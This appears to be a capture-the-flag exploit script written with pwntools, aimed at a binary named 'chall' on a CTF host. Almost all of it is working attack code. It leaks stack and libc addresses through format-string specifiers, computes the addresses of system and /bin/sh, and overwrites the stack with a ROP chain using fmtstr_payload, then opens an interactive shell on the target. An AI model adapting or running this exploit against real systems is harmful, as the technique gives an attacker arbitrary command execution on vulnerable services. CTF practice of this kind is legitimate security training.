#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
libc_path = 'libc.so.6'
os_level = 64
binary_name = 'chall'
remote_addr, port = 'chall.ctf.k1nd4sus.it 31001'.split(' ')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    #libc = elf.libc
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
    #if local: libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
    #if local: libc_path = 'lib/i386-linux-gnu/libc.so.6'
else:
    print('Error os!!!')
    exit()
#libc = ELF(libc_path)

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
leak = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
uu32 = lambda data: u32(data.ljust(4,b'\x00'))
uu64 = lambda data: u64(data.ljust(8,b'\x00'))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak:int,funcname:bytes,path=''):
    if path == '':
        libc = LibcSearcher(funcname,leak)
        base = leak - libc.dump(funcname)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[funcname]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))
    log.success('{}--> {:#x}'.format('libc_base',base))
    return (base,system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    payload = b'%53$p' + b'p' + b'x'*0xfe
    sda(b'enjoy\n',payload)
    stack = int(ru(b'p').strip(b'p'),16) + 0x328
    leak('stack',stack)
    rl()
    slp(2)
    payload = b'%193$p' + b'p' + b'x'*0xfe
    sd(payload)
    libc_start_main_addr = int(ru(b'p').strip(b'p'),16) - 139
    rl()
    leak('libc_start_main_addr',libc_start_main_addr)
    base,system,bin_sh = ret2libc(libc_start_main_addr,'__libc_start_main',libc_path)
    leak('system',system)
    leak('bin_sh',bin_sh)
    prdi = base + 0x10f75b
    ret = base + 0x2882f
    leak('prid',prdi)
    leak('ret',ret)
    slp(2)
    payload = b'n'*0xfa + b'aaaaaa' + fmtstr_payload(42,{stack:prdi})
    sd(payload)
    slp(2)
    payload = b'n'*0xfa + b'aaaaaa' +  fmtstr_payload(42,{stack+0x8:bin_sh})
    sd(payload)
    slp(2)
    payload = b'n'*0xfa + b'aaaaaa' + fmtstr_payload(42,{stack+0x10:ret})
    sd(payload)
    slp(2)
    payload = b'n'*0xfa + b'aaaaaa' + fmtstr_payload(42,{stack+0x18:system})
    sd(payload)
    slp(2)
    #dbg()
    sd('end')
    p.interactive()